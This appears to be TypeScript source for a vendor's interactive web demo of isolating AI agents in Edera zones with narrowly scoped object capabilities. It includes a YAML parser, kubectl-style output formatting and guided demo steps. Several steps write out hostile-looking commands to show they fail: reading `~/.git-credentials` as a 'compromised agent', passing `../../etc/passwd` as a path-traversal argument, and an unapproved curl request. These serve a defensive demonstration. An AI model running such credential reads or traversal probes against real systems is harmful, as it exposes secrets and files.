// A small YAML reader for the manifests above: block maps, block lists, and
// flow lists of scalars. Enough to drive the simulator and `kubectl describe`.
// ---------------------------------------------------------------------------
type YamlValue = string | number | boolean | null | YamlValue[] | { [key: string]: YamlValue };
type YamlMap = { [key: string]: YamlValue };

const parseYamlScalar = (raw: string): YamlValue => {
  const value = raw.trim();
  if (value === "") return null;
  if (value.startsWith("[") && value.endsWith("]")) {
    return value
      .slice(1, -1)
      .split(",")
      .map((item) => item.trim())
      .filter(Boolean)
      .map(parseYamlScalar);
  }
  if (/^(['"]).*\1$/.test(value)) return value.slice(1, -1);
  if (value === "true" || value === "false") return value === "true";
  if (/^-?\d+$/.test(value)) return Number(value);
  return value;
};

const parseYaml = (text: string): YamlValue => {
  const lines = text
    .split("\n")
    .map((line) => line.replace(/\s+#.*$/, ""))
    .filter((line) => line.trim() !== "" && !line.trim().startsWith("#"))
    .map((line) => ({ indent: line.length - line.trimStart().length, text: line.trim() }));
  let index = 0;

  const parseBlock = (indent: number): YamlValue => {
    if (index >= lines.length) return null;
    return lines[index].text.startsWith("- ") || lines[index].text === "-"
      ? parseList(lines[index].indent)
      : parseMap(indent);
  };

  // Map entries at exactly `indent`. A nested block may sit at a deeper
  // indent, or at the same indent when it is a list ("key:\n- item").
  const parseMap = (indent: number, into: YamlMap = {}): YamlMap => {
    while (index < lines.length && lines[index].indent === indent && !lines[index].text.startsWith("- ")) {
      const { text } = lines[index];
      const colon = text.search(/:(\s|$)/);
      if (colon < 0) {
        index++;
        continue;
      }
      const key = text.slice(0, colon).trim().replace(/^(['"])(.*)\1$/, "$2");
      const rest = text.slice(colon + 1).trim();
      index++;
      if (rest !== "") {
        into[key] = parseYamlScalar(rest);
      } else if (
        index < lines.length &&
        (lines[index].indent > indent ||
          (lines[index].indent === indent && lines[index].text.startsWith("- ")))
      ) {
        into[key] = parseBlock(lines[index].indent);
      } else {
        into[key] = null;
      }
    }
    return into;
  };

  const parseList = (indent: number): YamlValue[] => {
    const items: YamlValue[] = [];
    while (index < lines.length && lines[index].indent === indent && lines[index].text.startsWith("- ")) {
      const content = lines[index].text.slice(2).trim();
      // "- key: value" opens a map whose keys sit two columns in.
      if (/^[^'"\[][^:]*:(\s|$)/.test(content)) {
        lines[index] = { indent: indent + 2, text: content };
        items.push(parseMap(indent + 2));
      } else {
        index++;
        items.push(parseYamlScalar(content));
      }
    }
    return items;
  };

  return parseBlock(0);
};

const yamlMap = (value: YamlValue | undefined): YamlMap =>
  value && typeof value === "object" && !Array.isArray(value) ? value : {};
const yamlList = (value: YamlValue | undefined): YamlValue[] => (Array.isArray(value) ? value : []);
const yamlString = (value: YamlValue | undefined): string | undefined =>
  value === null || value === undefined || typeof value === "object" ? undefined : String(value);

// A provider plus the capabilities selected from it. Templates and sessions
// both carry a list of these in spec.capabilities (a single map is accepted
// too).
interface CapabilityGrant {
  provider: string;
  capabilities: string[];
}

interface CapabilityProviderSpec {
  // spec.capabilities[]: object capability name -> command it runs.
  publishes: Record<string, string[]>;
  labels: Record<string, string>;
  container: string;
  image: string;
  mountPath?: string;
  readOnly: boolean;
  secretName?: string;
}

interface RuntimeManifestDoc {
  kind: string;
  name: string;
  spec: YamlMap;
  source: string;
  // SandboxTemplate / SandboxSession only.
  grants: CapabilityGrant[];
  templateRef?: string;
  image?: string;
  // CapabilityProvider only: the provider pod and what it publishes.
  provider?: CapabilityProviderSpec;
}

const parseCapabilityGrants = (value: YamlValue | undefined): CapabilityGrant[] =>
  (Array.isArray(value) ? value : value ? [value] : [])
    .map((item) => yamlMap(item))
    .filter((item) => yamlString(item.provider))
    .map((item) => ({
      provider: yamlString(item.provider)!,
      capabilities: yamlList(item.capabilities).map((cap) => String(cap)),
    }));

const parseCapabilityProvider = (spec: YamlMap): CapabilityProviderSpec | undefined => {
  const pod = yamlMap(spec.spec);
  const container = yamlMap(yamlList(pod.containers)[0]);
  if (!yamlString(container.image)) return undefined;
  const publishes: Record<string, string[]> = {};
  for (const item of yamlList(spec.capabilities)) {
    const entry = yamlMap(item);
    const name = yamlString(entry.name);
    if (name) publishes[name] = yamlList(entry.command).map((word) => String(word));
  }
  const mount = yamlMap(yamlList(container.volumeMounts)[0]);
  const volume = yamlMap(yamlList(pod.volumes)[0]);
  return {
    publishes,
    labels: Object.fromEntries(
      Object.entries(yamlMap(yamlMap(spec.metadata).labels)).map(([key, value]) => [key, String(value)]),
    ),
    container: yamlString(container.name) || "workload",
    image: yamlString(container.image)!,
    mountPath: yamlString(mount.mountPath),
    readOnly: mount.readOnly === true,
    secretName: yamlString(yamlMap(volume.secret).secretName),
  };
};

const parseRuntimeManifest = (yaml: string): RuntimeManifestDoc[] =>
  yaml
    .split(/^---\s*$/m)
    .map((source) => {
      const doc = yamlMap(parseYaml(source));
      const kind = yamlString(doc.kind) || "";
      const spec = yamlMap(doc.spec);
      const podSpec = yamlMap(yamlMap(spec.podTemplate).spec);
      return {
        kind,
        name: yamlString(yamlMap(doc.metadata).name) || "",
        spec,
        source: source.trim(),
        grants: kind === "CapabilityProvider" ? [] : parseCapabilityGrants(spec.capabilities),
        provider: kind === "CapabilityProvider" ? parseCapabilityProvider(spec) : undefined,
        templateRef: yamlString(yamlMap(spec.templateRef).name),
        image: yamlString(yamlMap(yamlList(podSpec.containers)[0]).image),
      };
    })
    .filter((doc) => doc.kind && doc.name);

const formatGrants = (grants: CapabilityGrant[]) =>
  grants.map((grant) => `${grant.provider}[${grant.capabilities.join(",")}]`).join(",");

// ---------------------------------------------------------------------------
// `kubectl describe` for custom resources: keys sorted and title-cased, maps
// and lists nested by two spaces, and "Key:\tvalue" lines aligned the way
// kubectl's tabwriter aligns them (one column per run of consecutive lines).
// ---------------------------------------------------------------------------
const DESCRIBE_ACRONYMS: Record<string, string> = { api: "API", uid: "UID", url: "URL", id: "ID", ip: "IP" };

const describeLabel = (key: string) =>
  /[./]/.test(key)
    ? key
    : key
        .replace(/([a-z0-9])([A-Z])/g, "$1 $2")
        .split(" ")
        .map((word) => DESCRIBE_ACRONYMS[word.toLowerCase()] || word.charAt(0).toUpperCase() + word.slice(1))
        .join(" ");

const describeValueLines = (value: YamlValue, indent: number): string[] => {
  const pad = " ".repeat(indent);
  const lines: string[] = [];
  if (Array.isArray(value)) {
    for (const item of value) {
      if (item && typeof item === "object") lines.push(...describeValueLines(item, indent));
      else lines.push(`${pad}${String(item)}`);
    }
    return lines;
  }
  if (value && typeof value === "object") {
    for (const key of Object.keys(value).sort()) {
      const child = value[key];
      if (child && typeof child === "object") {
        lines.push(`${pad}${describeLabel(key)}:`);
        lines.push(...describeValueLines(child, indent + 2));
      } else {
        lines.push(`${pad}${describeLabel(key)}:\t${child === null ? "" : String(child)}`);
      }
    }
  }
  return lines;
};

const alignDescribeColumns = (lines: string[]) => {
  const out: string[] = [];
  let run: string[] = [];
  const flush = () => {
    const width = Math.max(...run.map((line) => line.indexOf("\t"))) + 2;
    for (const line of run) {
      const tab = line.indexOf("\t");
      out.push(`${line.slice(0, tab).padEnd(width)}${line.slice(tab + 1)}`.trimEnd());
    }
    run = [];
  };
  for (const line of lines) {
    if (line.includes("\t")) {
      run.push(line);
    } else {
      if (run.length) flush();
      out.push(line);
    }
  }
  if (run.length) flush();
  return out.join("\n");
};

// The full walkthrough, including the Sandbox / Snapshot / Fork steps. Their
// commands and manifests still work in the terminal; the guide only shows the
// object capability steps (see AGENT_SANDBOX_DEMO_STEPS below).
const ALL_AGENT_SANDBOX_DEMO_STEPS: DemoStep[] = [
  {
    id: "protect-zone-list-initial",
    title: "List Edera zones",
    description:
      "Use the Protect CLI to list zones on this node. Nothing is running yet; the next steps create a zone.",
    command: "protect zone list",
  },
  {
    id: "ocap-definition",
    title: "Read the GitHub capability manifest",
    description:
      "An object capability is explicit authority: the agent receives a thing it can use, and that thing grants a narrowly scoped operation. <code class='guide-code'>~/github.toml</code> describes one: git over HTTPS to GitHub, but only for the Kubernetes repository. GET is allowed for reads and POST for pushes; other repositories and endpoints are not granted. ",
    command: "cat github.toml",
  },
  {
    id: "protect-zone-launch",
    title: "Launch a zone",
    description:
      "A zone is the isolation boundary: its own kernel, memory and process space. Zones don't publish capabilities themselves; workloads running inside them do, with <code class='guide-code'>--ocap-publish</code>. You'll launch one that does next.",
    command: `protect zone launch --name ${OCAP_ZONE_NAME}`,
  },
  {
    id: "protect-zone-list-ready",
    title: "Verify the zone is ready",
    description:
      "List zones again and verify that the new zone has reached ready state and has been assigned network addresses.",
    command: "protect zone list",
  },
  {
    id: "ocap-relay-launch",
    title: "Publish the GitHub capability from a workload",
    description:
      `Start a relay workload in the zone that publishes <code class='guide-code'>github</code>. The credential stays with the relay; workloads that consume the capability never see it.`,
    command: OCAP_RELAY_LAUNCH_COMMAND,
  },
  {
    id: "ocap-workload-help",
    title: "Find the capability flags on workloads",
    description:
      "Workloads declare the capabilities they use. <code class='guide-code'>--ocap-consume</code> takes a capability by name; <code class='guide-code'>--ocap-publish</code> and <code class='guide-code'>--ocap-implements</code> let a workload provide one of its own.",
    command: "protect workload launch -h",
  },
  {
    id: "ocap-workload-launch",
    title: "Launch the agent with one capability",
    description:
      "Start the agent in the zone and give it exactly one button: the <code class='guide-code'>github</code> capability. It gets no ambient network access.",
    command: `protect workload launch --zone ${OCAP_ZONE_NAME} --name ${OCAP_WORKLOAD_NAME} --ocap-consume ${OCAP_GITHUB_NAME} ${OCAP_WORKLOAD_IMAGE}`,
  },
  {
    id: "ocap-no-credentials",
    title: "Verify credentials stay outside the sandbox",
    description:
      "Look at the agent's environment. There is no GitHub token: authentication happens outside the sandbox, in the capability relay. Only the settings from the manifest's <code class='guide-code'>[agent]</code> section are present.",
    command: `protect workload exec ${OCAP_WORKLOAD_NAME} -- env`,
  },
  {
    id: "ocap-allowed",
    title: "Use the capability",
    description:
      "Clone the repository granted by the capability from inside the agent. git's GitHub URL is routed to the capability relay, the request matches the explicit GET rule, and it is allowed.",
    command: `protect workload exec ${OCAP_WORKLOAD_NAME} -- git clone https://github.com/kubernetes/kubernetes.git`,
  },
  {
    id: "ocap-denied-repository",
    title: "Try another repository",
    description:
      "The agent still has a GitHub capability, but it does not grant this repository. The capability rejects the request.",
    command: `protect workload exec ${OCAP_WORKLOAD_NAME} -- git clone https://github.com/torvalds/linux.git`,
  },
  {
    id: "ocap-denied-network",
    title: "Try arbitrary network access",
    description:
      "There is no ambient internet capability inside the sandbox. A request to an unrelated endpoint has nowhere to go and is denied.",
    command: `protect workload exec ${OCAP_WORKLOAD_NAME} -- curl https://example.com`,
  },
  {
    id: "ocap-compromise",
    title: "Assume the agent is compromised",
    description:
      "An attacker with full control of the agent goes looking for credentials. There are none to steal: the agent only possesses the capabilities it was given. It has the buttons we granted, not the rest of the console.",
    command: `protect workload exec ${OCAP_WORKLOAD_NAME} -- cat ~/.git-credentials`,
  },
  {
    id: "protect-zone-destroy",
    title: "Destroy the zone",
    description:
      "Tear down the zone, along with any workloads running inside it and the capabilities they published. The --wait flag makes the lifecycle transition explicit in the terminal.",
    command: `protect zone destroy ${OCAP_ZONE_NAME} --wait`,
  },
  {
    id: "protect-zone-list-final",
    title: "Confirm the zone was destroyed",
    description:
      "List the zones one final time. The zone should now be shown as destroyed, demonstrating the complete Edera zone lifecycle.",
    command: "protect zone list",
  },
  {
    id: "readme-zone-launch",
    title: "Launch a capability provider zone",
    description:
      `A zone is the isolation boundary: its own kernel, memory and process space. Zones don't publish capabilities themselves; workloads inside them do, with <code class='guide-code'>--ocap-publish</code>. Launch <code class='guide-code'>${README_ZONE_NAME}</code> for the provider workload, which holds the credential, isolated from whoever calls it.`,
    command: `protect zone launch --name ${README_ZONE_NAME}`,
  },
  {
    id: "readme-source",
    title: "Read the README fetcher",
    description:
      `The provider is a small program, written the same way in <code class='guide-code'>rust/</code>, <code class='guide-code'>python/</code> and <code class='guide-code'>typescript/</code>. It idles until called with <code class='guide-code'>get &lt;repo&gt;</code>, accepts only alphanumeric repository names, and reads its GitHub token from <code class='guide-code'>${README_TOKEN_MOUNT_PATH}</code>.`,
    command: "cat rust/main.rs",
  },
  {
    id: "readme-image-build",
    title: "Build the provider image",
    description:
      `Each language directory has a Dockerfile whose entrypoint is <code class='guide-code'>/readme-fetch idle</code>. Build the Rust image; <code class='guide-code'>python</code> and <code class='guide-code'>typescript</code> build the same way.`,
    command: `docker build -t ${README_WORKLOAD_IMAGE} rust`,
  },
  {
    id: "readme-workload-launch",
    title: "Launch the README fetcher as a provider",
    description:
      `The <code class='guide-code'>readme-fetch</code> image (Rust here; <code class='guide-code'>-python</code> and <code class='guide-code'>-typescript</code> builds behave the same) idles until called. A GitHub token staged at <code class='guide-code'>${README_TOKEN_HOST_PATH}</code> is mounted read-only into the provider at <code class='guide-code'>${README_TOKEN_MOUNT_PATH}</code>, and <code class='guide-code'>--ocap-publish</code> exposes exactly one command as <code class='guide-code'>${README_CAPABILITY}</code>.`,
    command: README_WORKLOAD_LAUNCH_COMMAND,
  },
  {
    id: "readme-dial",
    title: "Dial the capability",
    description:
      `Call <code class='guide-code'>${README_CAPABILITY}</code> with a repository name. The provider runs <code class='guide-code'>${README_CAPABILITY_COMMAND} ${README_DIAL_REPO}</code> and prints the README of <code class='guide-code'>edera-dev/${README_DIAL_REPO}</code>. The caller gets the result, never the token.`,
    command: `protect object-capability dial ${README_CAPABILITY} ${README_DIAL_REPO}`,
  },
  {
    id: "readme-dial-invalid",
    title: "Ask for something the capability doesn't do",
    description:
      `The caller only supplies the argument; the command is fixed by the publisher. The fetcher accepts an alphanumeric <code class='guide-code'>edera-dev</code> repository name and nothing else, so a path-like argument is refused.`,
    command: `protect object-capability dial ${README_CAPABILITY} ../../etc/passwd`,
  },
  {
    id: "readme-zone-destroy",
    title: "Destroy the provider zone",
    description:
      `Tear down <code class='guide-code'>${README_ZONE_NAME}</code>. The provider workload, its token mount and the <code class='guide-code'>${README_CAPABILITY}</code> capability go with it.`,
    command: `protect zone destroy ${README_ZONE_NAME} --wait`,
  },
  {
    id: "edera-crds",
    title: "Verify the Edera Sandbox CRDs",
    description:
      "The Edera runtime controller already running in <code class='guide-code'>edera-runtime</code> serves three resources under <code class='guide-code'>runtime.edera.dev/v1alpha1</code>: <code class='guide-code'>Sandbox</code>, <code class='guide-code'>Snapshot</code> and <code class='guide-code'>Fork</code>. Confirm their CRDs are installed.",
    command:
      "kubectl get crd sandboxes.runtime.edera.dev snapshots.runtime.edera.dev forks.runtime.edera.dev",
  },
  {
    id: "capability-crds",
    title: "Verify the capability CRDs",
    description:
      "The Edera runtime controller serves three capability resources under <code class='guide-code'>runtime.edera.dev/v1alpha1</code>: <code class='guide-code'>CapabilityProvider</code> runs a provider and the capabilities it offers, <code class='guide-code'>SandboxTemplate</code> grants a subset of a provider's capabilities, and <code class='guide-code'>SandboxSession</code> selects from what its template grants.",
    command:
      "kubectl get crd capabilityproviders.runtime.edera.dev sandboxtemplates.runtime.edera.dev sandboxsessions.runtime.edera.dev",
  },
  {
    id: "provider-manifest",
    title: "Read the CapabilityProvider",
    description:
      `<code class='guide-code'>spec.capabilities</code> lists what the provider offers: here one capability, <code class='guide-code'>dev.example/readme</code>, which runs <code class='guide-code'>/readme-fetch get</code>. The inner <code class='guide-code'>spec</code> is the provider's pod. Its GitHub token comes from the <code class='guide-code'>${CAPABILITY_SECRET_NAME}</code> Secret, already in the cluster, which only the provider mounts, read-only at <code class='guide-code'>/run/secrets/token</code>.`,
    command: "cat examples/capability_provider.yaml",
  },
  {
    id: "provider-apply",
    title: "Apply the capability provider",
    description:
      "Apply it. The controller accepts the <code class='guide-code'>CapabilityProvider</code> and starts its provider pod in its own Edera zone.",
    command: "kubectl apply -f examples/capability_provider.yaml",
  },
  {
    id: "provider-describe",
    title: "Describe the capability provider",
    description:
      "The provider and everything it offers is one resource. The <code class='guide-code'>capabilities.edera.dev</code> finalizer keeps the provider around until nothing depends on it.",
    command: "kubectl describe capabilityproviders.runtime.edera.dev",
  },
  {
    id: "kubernetes-provider-apply",
    title: "Add a provider with several capabilities",
    description:
      "One provider can offer many capabilities. The <code class='guide-code'>kubernetes</code> provider offers <code class='guide-code'>dev.example/get-pods</code> and <code class='guide-code'>dev.example/get-pod-logs</code> from a single pod, rather than one resource per capability.",
    command: "kubectl apply -f examples/kubernetes_provider.yaml",
  },
  {
    id: "template-apply",
    title: "Apply the SandboxTemplate",
    description:
      `A template grants capabilities by provider. <code class='guide-code'>${SANDBOX_TEMPLATE_NAME}</code> grants <code class='guide-code'>dev.example/readme</code> from <code class='guide-code'>github</code>, and nothing from <code class='guide-code'>kubernetes</code>. The controller validates every grant against the providers in the cluster.`,
    command: "kubectl apply -f examples/sandbox_template.yaml",
  },
  {
    id: "template-describe",
    title: "Look at the template",
    description:
      "<code class='guide-code'>Spec.Capabilities</code> names the provider and the capabilities granted from it. <code class='guide-code'>Status</code> shows the template was validated and <code class='guide-code'>Accepted</code>.",
    command: `kubectl describe sandboxtemplate ${SANDBOX_TEMPLATE_NAME}`,
  },
  {
    id: "session-apply",
    title: "Apply the SandboxSession",
    description:
      `<code class='guide-code'>${SANDBOX_SESSION_NAME}</code> references the template and selects the <code class='guide-code'>github</code> provider with <code class='guide-code'>dev.example/readme</code>. The controller creates a zone and a workload that consume exactly that. An agent can create the same object through the SDK.`,
    command: "kubectl apply -f examples/sandbox_session.yaml",
  },
  {
    id: "session-describe",
    title: "Describe the session",
    description:
      "The provider is selected with the specific capabilities available within this session. Its zone appears in the Edera Zones panel, and the capability card shows <code class='guide-code'>dev.example/readme</code> bound to it.",
    command: `kubectl describe sandboxsessions.runtime.edera.dev ${SANDBOX_SESSION_NAME}`,
  },
  {
    id: "session-denied",
    title: "Ask for a capability the template doesn't grant",
    description:
      `<code class='guide-code'>${SANDBOX_SESSION_DENIED_NAME}</code> asks for <code class='guide-code'>dev.example/get-pods</code> from <code class='guide-code'>kubernetes</code>. The provider exists and offers it, but the template grants nothing from that provider, so the session is rejected.`,
    command: "kubectl apply -f examples/sandbox_session_denied.yaml",
  },
  {
    id: "sdk-read",
    title: "Read the SDK version",
    description:
      "An agent can do the same through the SDK. <code class='guide-code'>SandboxSession(...)</code> becomes the same SandboxSession object, selecting a provider and its capabilities, and leaving the <code class='guide-code'>with</code> block deletes it.",
    command: "cat examples/session.py",
  },
  {
    id: "sdk-run",
    title: "Run it",
    description:
      "Run the script. Watch the SandboxSession it generates, the zone come up in the Edera Zones panel, the command run inside it, and the session clean itself up.",
    command: "python3 examples/session.py",
  },
  {
    id: "session-cleanup",
    title: "Delete the session",
    description:
      `Delete <code class='guide-code'>${SANDBOX_SESSION_NAME}</code>. Its zone and workload go with it; the template and providers stay for the next session.`,
    command: `kubectl delete sandboxsession ${SANDBOX_SESSION_NAME}`,
  },
  {
    id: "provider-list",
    title: "List the capability providers",
    description: "Each provider, the capabilities it offers, and its provider pod.",
    command: "kubectl get capabilityproviders",
  },
  {
    id: "capability-pod",
    title: "Inspect the provider pod",
    description:
      "The provider runs with the <code class='guide-code'>edera</code> runtime class, so it gets its own zone. The <code class='guide-code'>dev.edera/ocap-publish</code> annotation lists every capability the pod publishes.",
    command: "kubectl describe po edera-capability-github | head -n 10",
  },
  {
    id: "capability-dial",
    title: "Dial the capability",
    description:
      "Call the provider directly. It reads <code class='guide-code'>edera-dev/protect</code> (a private repo) with the token from the Secret; the caller only sees the README.",
    command: `protect object-capability dial ${README_CAPABILITY} protect | head -n 5`,
  },
  {
    id: "session-inspect",
    title: "Inspect the session",
    description: "List the session with its pod. It runs with the <code class='guide-code'>edera</code> runtime.",
    command: "kubectl get sandboxsession,pods",
  },
  {
    id: "session-workload",
    title: "See what the session's workload consumes",
    description:
      "From the Protect side, the session is an ordinary zone and workload. Its <code class='guide-code'>ocapConsume</code> lists the selected capabilities, and nothing else.",
    command: "protect workload list -o json-pretty",
  },  {
    id: "capability-secret",
    title: "Create the provider's token Secret",
    description:
      `The <code class='guide-code'>github</code> provider reads private READMEs with a GitHub token. The token lives in a Secret that only the provider mounts. The lab creates it up front; on your own cluster, create <code class='guide-code'>${CAPABILITY_SECRET_NAME}</code> from the token staged at <code class='guide-code'>/tmp/token</code>.`,
    command: CAPABILITY_SECRET_COMMAND,
  },

  {
    id: "edera-sandbox-manifest",
    title: "Read the Sandbox manifest",
    description:
      "A <code class='guide-code'>Sandbox</code> wraps a pod template. The Edera runtime controller runs that pod in its own Edera zone with a dedicated guest kernel, so the workload never shares the node's kernel.",
    command: "cat agent-sandbox/edera-sandbox.yaml",
  },
  {
    id: "edera-sandbox-apply",
    title: "Create the Sandbox",
    description:
      "Apply the Sandbox. The controller creates the backing pod with <code class='guide-code'>runtimeClassName: edera</code>.",
    command: "kubectl apply -f agent-sandbox/edera-sandbox.yaml",
  },
  {
    id: "edera-sandbox-ready",
    title: "Wait for the Sandbox to become Ready",
    description:
      "Wait for the controller to report the Sandbox as Ready. Watch its zone appear in the Edera Zones panel.",
    command: "kubectl wait --for=condition=Ready sandbox/sandbox-sample --timeout=120s",
  },
  {
    id: "edera-sandbox-inspect",
    title: "Inspect the Sandbox and its pod",
    description:
      "List the Sandbox with its pod. Note the <code class='guide-code'>edera</code> runtime and the node it was scheduled on; the snapshot and forks will stay on that node.",
    command: "kubectl get sandbox,pods -o wide",
  },
  {
    id: "edera-sandbox-exec",
    title: "Execute Python inside the Sandbox",
    description:
      "Run code in the sandboxed Python runtime. It executes inside the Edera zone rather than on the node's shared kernel.",
    command: "kubectl exec -it sandbox-sample -- python3 -c \"print(2+2)\"",
  },
  {
    id: "edera-sandbox-kernel",
    title: "Verify the dedicated Edera kernel",
    description:
      "Compare the kernel reported from inside the Sandbox with the host. A different kernel is the clearest sign the agent isn't sharing the node kernel.",
    command: "kubectl exec sandbox-sample -- uname -r",
  },
  {
    id: "edera-snapshot-manifest",
    title: "Read the Snapshot manifest",
    description:
      "A <code class='guide-code'>Snapshot</code> freezes a running Sandbox. <code class='guide-code'>remote: Local</code> keeps it on the Sandbox's node; <code class='guide-code'>Remote</code> needs shared snapshot storage, which this install doesn't enable.",
    command: "cat agent-sandbox/edera-snapshot.yaml",
  },
  {
    id: "edera-snapshot-apply",
    title: "Snapshot the Sandbox",
    description:
      "Apply the Snapshot to capture <code class='guide-code'>sandbox-sample</code> as it is running right now.",
    command: "kubectl apply -f agent-sandbox/edera-snapshot.yaml",
  },
  {
    id: "edera-snapshot-inspect",
    title: "Inspect the Snapshot",
    description:
      "Check the Snapshot is Ready and stored on the same node as the Sandbox.",
    command: "kubectl get snapshot sandbox-sample-snap",
  },
  {
    id: "edera-fork-manifest",
    title: "Read the Fork manifest",
    description:
      "A <code class='guide-code'>Fork</code> starts new copies of a Sandbox from its frozen state, so each replica skips cold start and begins exactly where the original was. Because the snapshot is local, the forks run on the same node.",
    command: "cat agent-sandbox/edera-fork.yaml",
  },
  {
    id: "edera-fork-apply",
    title: "Fork the Sandbox",
    description:
      "Apply the Fork to start two replicas. Each one gets its own Edera zone.",
    command: "kubectl apply -f agent-sandbox/edera-fork.yaml",
  },
  {
    id: "edera-fork-inspect",
    title: "Inspect the forks",
    description:
      "List the Fork and its pods. Both replicas are running with the <code class='guide-code'>edera</code> runtime on the Sandbox's node, and two new zones are in the Edera Zones panel.",
    command: "kubectl get fork,pods -o wide",
  },
  {
    id: "edera-fork-exec",
    title: "Run code in a fork",
    description:
      "Each fork is an independent, isolated copy: work done here doesn't touch the original Sandbox or the other fork.",
    command: "kubectl exec sandbox-sample-snap-fork-0 -- python3 -c \"print(2+2)\"",
  },
  {
    id: "agent-sandbox-security-review",
    title: "Review the agent security boundary",
    description:
      "Edera contains the compute environment: the agent gets its own kernel, filesystem, memory, and process space. Object capabilities then make authority explicit and narrowly scoped. Credentials can remain outside the agent while capabilities expose only the operations the workload actually needs.",
    command: "cat agent-sandbox/edera-sandbox.yaml",
    optional: true,
  },
  {
    id: "agent-sandbox-next-steps",
    title: "Plan production protections",
    description:
      `For production agents, layer controls around the Edera zone: use workload identity and attestation with SPIRE, give agents narrowly scoped object capabilities, keep credentials outside the agent, minimize tool authority, and consider an in-zone sub-sandbox for especially risky tool calls. <a href="https://docs.edera.dev/technical-overview/security/reference-architecture/#ai-agent-isolation" target="_blank" rel="noopener noreferrer">Edera AI Agent isolation reference architecture →</a>`,
    command: "kubectl get runtimeclass edera",
    optional: true,
  },
  {
    id: "edera-cleanup",
    title: "Clean up the Sandbox, Snapshot and Fork",
    description:
      "Delete the demo resources when you're finished. Their pods and Edera zones are removed with them.",
    command: "kubectl delete fork,snapshot,sandbox --all",
    optional: true,
  },
];

// The guide walks the CapabilityProvider → SandboxTemplate → SandboxSession
// flow and ends once the session is cleaned up, which is where the completion
// pop-up appears. Every other step's command still works in the terminal (and
// is listed in `help`); it just isn't walked through.
const FIRST_GUIDED_STEP_ID = "capability-crds";
const LAST_GUIDED_STEP_ID = "session-cleanup";
const AGENT_SANDBOX_DEMO_STEPS: DemoStep[] = ALL_AGENT_SANDBOX_DEMO_STEPS.slice(
  ALL_AGENT_SANDBOX_DEMO_STEPS.findIndex((step) => step.id === FIRST_GUIDED_STEP_ID),
  ALL_AGENT_SANDBOX_DEMO_STEPS.findIndex((step) => step.id === LAST_GUIDED_STEP_ID) + 1,
);

async function initTerminalDemo() {

  const app = document.querySelector<HTMLDivElement>("#app")!;

  app.innerHTML = `
    <div class="demo-shell">

      <header class="top-header">
        <a href="https://edera.dev" class="logo-link">EDERA</a>
        <a
          href="https://on.edera.dev"
          target="_blank"
          rel="noopener noreferrer"
          class="edera-free-cta"
          style="justify-self:end;align-self:center;display:inline-flex;align-items:center;padding:12px 22px;border-radius:999px;background:var(--edera-lime);color:var(--edera-ink);font-weight:800;text-decoration:none;white-space:nowrap;"
        >Try Edera for free →</a>
      </header>

      <section class="brand-hero" aria-labelledby="hero-title">
        <div class="hero-eyebrow">WEBERNETES DEMO</div>
        <h2 id="hero-title">AGENT<br />RUNTIME</h2>
        <p>
          Edera allows you to give an AI agent limited capabilities such as scoped
          permissions to external services, within our secure container and agent sandbox.
        </p>
        <button id="hero-run-btn" class="hero-cta" type="button">Jump to Terminal</button>
      </section>

      <div class="demo-kicker">Web­ernetes × Edera - AI Agent Runtime Demo</div>

      <div class="dashboard-grid">

        <div class="panel" id="pods-panel">
          <div class="panel-header">
            <span class="drag-handle">⋮⋮</span>
            <h3>📦 Active Pods</h3>
            <span id="pod-count" class="panel-count">0 Pods</span>
            <button class="hide-btn" id="hide-pods-btn">Hide</button>
          </div>
          <div class="resource-body" id="pods-body">
            <div id="pod-grid" class="resource-list"></div>
          </div>
        </div>

        <div class="panel" id="nodes-panel">
          <div class="panel-header">
            <span class="drag-handle">⋮⋮</span>
            <h3>🖥️ Active Nodes</h3>
            <span id="node-count" class="panel-count">3 Nodes</span>
            <button class="hide-btn" id="hide-nodes-btn">Hide</button>
          </div>
          <div class="resource-body" id="nodes-body">
            <div id="node-grid" class="resource-list"></div>
          </div>
        </div>

        <div class="panel" id="capabilities-panel" style="grid-column:1 / -1;">
          <div class="panel-header">
            <span class="drag-handle">⋮⋮</span>
            <div>
              <h3>🔑 Agent Capabilities</h3>
              <div class="panel-subtitle">Narrow, explicit authority granted to the agent</div>
            </div>
            <span id="capability-count" class="panel-count">0 Capabilities</span>
            <button class="hide-btn" id="hide-capabilities-btn">Hide</button>
          </div>
          <div id="capabilities-body" style="padding:10px 18px 12px;background:transparent;color:#163c38;opacity:1;">
            <div id="capability-grid" class="capability-list" style="opacity:1;color:#0b2422;"></div>
          </div>
        </div>

      </div>

      <div class="panel protect-panel" id="protect-panel">
        <div class="panel-header">
          <span class="drag-handle">⋮⋮</span>
          <div>
            <h3>🛡️ Edera Zones</h3>
            <div class="panel-subtitle">Simulated Edera isolation boundaries</div>
          </div>
          <span id="zone-count" class="panel-count">0 Zones</span>
          <button class="hide-btn" id="hide-protect-btn">Hide</button>
        </div>
        <div class="protect-body" id="protect-body">
          <div id="zone-grid"></div>
        </div>
      </div>

      <div class="main-layout">

        <div class="terminal-panel">
          <div
            id="output"
            class="terminal-output"
            aria-live="polite"
          ></div>

          <div class="terminal-input-row">
            <span id="terminal-prompt">ivy@webernetes:~$</span>
            <input
              id="cmd"
              type="text"
              placeholder="Type 'help' or use Up/Down arrow keys for command history..."
              disabled
              autocomplete="off"
              spellcheck="false"
            />
          </div>
        </div>

        <div class="panel events-panel" id="events-panel">
          <div class="panel-header">
            <span class="drag-handle">⋮⋮</span>
            <h3>⚡ Lifecycle Events</h3>
            <button class="hide-btn" id="clear-events-btn">Clear</button>
            <button class="hide-btn" id="hide-events-btn">Hide</button>
          </div>
          <div id="events-stream" class="events-stream"></div>
        </div>

      </div>

      <div class="guide-panel" id="guide-panel">

        <div class="guide-header">
          <span class="drag-handle">⋮⋮</span>
          <div>
            <div class="guide-title" id="guide-title">🤖 Agent Sandbox</div>
            <div class="guide-subtitle" id="guide-subtitle">
              <span class="desktop-only">Run each command to sandbox workloads on the Edera Agent Runtime</span>
            </div>
          </div>

          <div id="guide-progress" class="guide-progress"></div>

          <button class="hide-btn" id="hide-guide-btn">Hide</button>
        </div>

        <div class="guide-body" id="guide-body">

          <div class="guide-current">
            <div class="guide-label">Suggested next command</div>
            <div id="guide-step-title" class="guide-step-title"></div>
            <div id="guide-description" class="guide-description"></div>

            <div class="suggested-command">
              <code id="suggested-command"></code>
              <button id="use-command-btn" class="use-command-btn">
                Use command
              </button>
            </div>
          </div>

          <div class="guide-side">
            <div class="guide-side-title">Demo flow</div>
            <div id="guide-step-list"></div>
          </div>

        </div>
      </div>

      <div
        class="edera-free-bottom"
        style="display:flex;justify-content:center;margin:32px 0 8px;"
      >
        <a
          href="https://ndouglas-edera.github.io/ctf-challenge-1/"
          target="_blank"
